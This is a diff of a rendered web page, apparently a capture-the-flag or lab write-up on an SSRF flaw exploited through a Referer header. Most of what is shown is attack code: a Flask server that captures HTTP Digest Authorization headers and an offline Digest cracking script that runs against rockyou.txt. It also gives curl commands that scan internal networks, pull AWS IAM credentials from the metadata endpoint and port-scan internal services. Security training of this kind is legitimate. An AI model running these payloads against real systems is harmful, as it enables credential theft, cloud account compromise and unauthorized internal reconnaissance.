+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CAPTURED REQUEST:
+</span></span><span class="line"><span class="cl">============================================================
+</span></span><span class="line"><span class="cl">Method: GET
+</span></span><span class="line"><span class="cl">Headers:
+</span></span><span class="line"><span class="cl">  Host: YOUR_SERVER_IP:8080
+</span></span><span class="line"><span class="cl">  User-Agent: python-requests/2.31.0
+</span></span><span class="line"><span class="cl">  Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">  Accept: */*
+</span></span><span class="line"><span class="cl">  Connection: keep-alive
+</span></span><span class="line"><span class="cl">  Authorization: Digest username=&#34;keno&#34;, realm=&#34;Authentication Required&#34;, nonce=&#34;...&#34;, uri=&#34;/auth&#34;, response=&#34;...&#34;, opaque=&#34;...&#34;, qop=auth, nc=00000001, cnonce=&#34;...&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">🔑 AUTHENTICATION CAPTURED:
+</span></span><span class="line"><span class="cl">  Digest username=&#34;keno&#34;, realm=&#34;Authentication Required&#34;, nonce=&#34;dGVzdA==&#34;, uri=&#34;/auth&#34;, response=&#34;a1b2c3d4...&#34;, opaque=&#34;xyz123&#34;, qop=auth, nc=00000001, cnonce=&#34;abc789&#34;
+</span></span><span class="line"><span class="cl">============================================================
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="step-4-extract-credentials">Step 4: Extract Credentials<a hidden class="anchor" aria-hidden="true" href="#step-4-extract-credentials">#</a></h3>
 <p>The HTTP Digest authentication contains:</p>
 <ul>
 <li><strong>username</strong>: Plaintext username (e.g., &ldquo;keno&rdquo;)</li>
@@ -296,31 +435,61 @@ Headers:
 <h3 id="step-5-direct-authentication-method">Step 5: Direct Authentication Method<a hidden class="anchor" aria-hidden="true" href="#step-5-direct-authentication-method">#</a></h3>
 <p><strong>Better Approach - Direct Credential Extraction:</strong></p>
 <p>Instead of trying to crack the digest, modify your capture server to intercept and use the full authentication flow:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, Response
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
-</span></span><span style="display:flex;"><span>target_auth_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://TARGET_SERVER:5000/auth&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/auth&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">capture_and_forward</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Capture the authorization header</span>
-</span></span><span style="display:flex;"><span>    auth_header <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Authorization&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Captured auth: </span><span style="color:#e6db74">{</span>auth_header<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Now we can use this to authenticate to the real server</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Extract username from digest</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;username=&#39;</span> <span style="color:#f92672">in</span> auth_header:
-</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> auth_header<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;username=&#34;&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&#34;&#39;</span>)[<span style="color:#ae81ff">0</span>]
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Username: </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">401</span>, {
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;WWW-Authenticate&#39;</span>: <span style="color:#e6db74">&#39;Digest realm=&#34;test&#34;, qop=&#34;auth&#34;, nonce=&#34;test123&#34;, opaque=&#34;test456&#34;&#39;</span>
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span>)
-</span></span></code></pre></div><h3 id="step-6-alternative---password-recovery-attack">Step 6: Alternative - Password Recovery Attack<a hidden class="anchor" aria-hidden="true" href="#step-6-alternative---password-recovery-attack">#</a></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Response</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_auth_url</span> <span class="o">=</span> <span class="s2">&#34;http://TARGET_SERVER:5000/auth&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/auth&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">capture_and_forward</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Capture the authorization header</span>
+</span></span><span class="line"><span class="cl">    <span class="n">auth_header</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Authorization&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Captured auth: </span><span class="si">{</span><span class="n">auth_header</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Now we can use this to authenticate to the real server</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Extract username from digest</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;username=&#39;</span> <span class="ow">in</span> <span class="n">auth_header</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">auth_header</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;username=&#34;&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Username: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">401</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;WWW-Authenticate&#39;</span><span class="p">:</span> <span class="s1">&#39;Digest realm=&#34;test&#34;, qop=&#34;auth&#34;, nonce=&#34;test123&#34;, opaque=&#34;test456&#34;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="step-6-alternative---password-recovery-attack">Step 6: Alternative - Password Recovery Attack<a hidden class="anchor" aria-hidden="true" href="#step-6-alternative---password-recovery-attack">#</a></h3>
 <p>Since HTTP Digest uses MD5 and we can observe the digest authentication in action, we can:</p>
 <ol>
 <li>Set up a capture server that records the digest challenge-response</li>
@@ -328,197 +497,418 @@ Headers:
 <li>Since we know all values except the password, perform an offline dictionary/brute-force attack</li>
 </ol>
 <p><strong>Digest Cracking Script:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">md5</span>(data):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hashlib<span style="color:#f92672">.</span>md5(data<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crack_digest</span>(username, realm, nonce, uri, response_hash, cnonce, nc, qop, wordlist):
-</span></span><span style="display:flex;"><span>    method <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;GET&#34;</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    ha2 <span style="color:#f92672">=</span> md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>method<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>uri<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(wordlist, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> f:
-</span></span><span style="display:flex;"><span>            password <span style="color:#f92672">=</span> password<span style="color:#f92672">.</span>strip()
-</span></span><span style="display:flex;"><span>            ha1 <span style="color:#f92672">=</span> md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>realm<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>ha1<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>nonce<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>nc<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>cnonce<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>qop<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>ha2<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>            
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> response <span style="color:#f92672">==</span> response_hash:
-</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] PASSWORD FOUND: </span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> password
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Password not found in wordlist&#34;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example usage with captured values</span>
-</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;keno&#34;</span>
-</span></span><span style="display:flex;"><span>realm <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Authentication Required&#34;</span>
-</span></span><span style="display:flex;"><span>nonce <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;captured_nonce_value&#34;</span>
-</span></span><span style="display:flex;"><span>uri <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/auth&#34;</span>
-</span></span><span style="display:flex;"><span>response_hash <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;captured_response_value&#34;</span>
-</span></span><span style="display:flex;"><span>cnonce <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;captured_cnonce_value&#34;</span>
-</span></span><span style="display:flex;"><span>nc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;00000001&#34;</span>
-</span></span><span style="display:flex;"><span>qop <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;auth&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>crack_digest(username, realm, nonce, uri, response_hash, cnonce, nc, qop, <span style="color:#e6db74">&#34;rockyou.txt&#34;</span>)
-</span></span></code></pre></div><hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">md5</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crack_digest</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">realm</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">response_hash</span><span class="p">,</span> <span class="n">cnonce</span><span class="p">,</span> <span class="n">nc</span><span class="p">,</span> <span class="n">qop</span><span class="p">,</span> <span class="n">wordlist</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">method</span> <span class="o">=</span> <span class="s2">&#34;GET&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">ha2</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">method</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">uri</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ha1</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">realm</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">ha1</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">nc</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">cnonce</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">qop</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">ha2</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="n">response_hash</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] PASSWORD FOUND: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">password</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Password not found in wordlist&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Example usage with captured values</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;keno&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">realm</span> <span class="o">=</span> <span class="s2">&#34;Authentication Required&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">nonce</span> <span class="o">=</span> <span class="s2">&#34;captured_nonce_value&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">uri</span> <span class="o">=</span> <span class="s2">&#34;/auth&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">response_hash</span> <span class="o">=</span> <span class="s2">&#34;captured_response_value&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">cnonce</span> <span class="o">=</span> <span class="s2">&#34;captured_cnonce_value&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">nc</span> <span class="o">=</span> <span class="s2">&#34;00000001&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">qop</span> <span class="o">=</span> <span class="s2">&#34;auth&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">crack_digest</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">realm</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">response_hash</span><span class="p">,</span> <span class="n">cnonce</span><span class="p">,</span> <span class="n">nc</span><span class="p">,</span> <span class="n">qop</span><span class="p">,</span> <span class="s2">&#34;rockyou.txt&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
 <h2 id="advanced-exploitation-scenarios">Advanced Exploitation Scenarios<a hidden class="anchor" aria-hidden="true" href="#advanced-exploitation-scenarios">#</a></h2>
 <h3 id="scenario-1-internal-network-access">Scenario 1: Internal Network Access<a hidden class="anchor" aria-hidden="true" href="#scenario-1-internal-network-access">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Scan internal network</span>
-</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Referer: http://192.168.1.1&#34;</span> http://TARGET:5000/api/check
-</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Referer: http://10.0.0.1&#34;</span> http://TARGET:5000/api/check
-</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Referer: http://172.16.0.1&#34;</span> http://TARGET:5000/api/check
-</span></span></code></pre></div><h3 id="scenario-2-cloud-metadata-exploitation-aws">Scenario 2: Cloud Metadata Exploitation (AWS)<a hidden class="anchor" aria-hidden="true" href="#scenario-2-cloud-metadata-exploitation-aws">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># AWS metadata endpoint</span>
-</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Referer: http://169.254.169.254/latest/meta-data&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>     http://TARGET:5000/api/check
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Try to access IAM credentials</span>
-</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Referer: http://169.254.169.254/latest/meta-data/iam/security-credentials&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>     http://TARGET:5000/api/check
-</span></span></code></pre></div><h3 id="scenario-3-port-scanning">Scenario 3: Port Scanning<a hidden class="anchor" aria-hidden="true" href="#scenario-3-port-scanning">#</a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Scan for internal services</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> port in <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">443</span> <span style="color:#ae81ff">3306</span> <span style="color:#ae81ff">5432</span> <span style="color:#ae81ff">6379</span> <span style="color:#ae81ff">8080</span> 9000; <span style="color:#66d9ef">do</span>
-</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Testing port </span>$port<span style="color:#e6db74">...&#34;</span>
-</span></span><span style="display:flex;"><span>    curl -H <span style="color:#e6db74">&#34;Referer: http://localhost:</span>$port<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>         http://TARGET:5000/api/check
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
-</span></span></code></pre></div><h3 id="scenario-4-protocol-smuggling">Scenario 4: Protocol Smuggling<a hidden class="anchor" aria-hidden="true" href="#scenario-4-protocol-smuggling">#</a></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Scan internal network</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Referer: http://192.168.1.1&#34;</span> http://TARGET:5000/api/check
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Referer: http://10.0.0.1&#34;</span> http://TARGET:5000/api/check
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Referer: http://172.16.0.1&#34;</span> http://TARGET:5000/api/check
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="scenario-2-cloud-metadata-exploitation-aws">Scenario 2: Cloud Metadata Exploitation (AWS)<a hidden class="anchor" aria-hidden="true" href="#scenario-2-cloud-metadata-exploitation-aws">#</a></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># AWS metadata endpoint</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Referer: http://169.254.169.254/latest/meta-data&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     http://TARGET:5000/api/check
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Try to access IAM credentials</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Referer: http://169.254.169.254/latest/meta-data/iam/security-credentials&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     http://TARGET:5000/api/check
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="scenario-3-port-scanning">Scenario 3: Port Scanning<a hidden class="anchor" aria-hidden="true" href="#scenario-3-port-scanning">#</a></h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Scan for internal services</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> port in <span class="m">22</span> <span class="m">80</span> <span class="m">443</span> <span class="m">3306</span> <span class="m">5432</span> <span class="m">6379</span> <span class="m">8080</span> 9000<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Testing port </span><span class="nv">$port</span><span class="s2">...&#34;</span>
+</span></span><span class="line"><span class="cl">    curl -H <span class="s2">&#34;Referer: http://localhost:</span><span class="nv">$port</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>         http://TARGET:5000/api/check
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
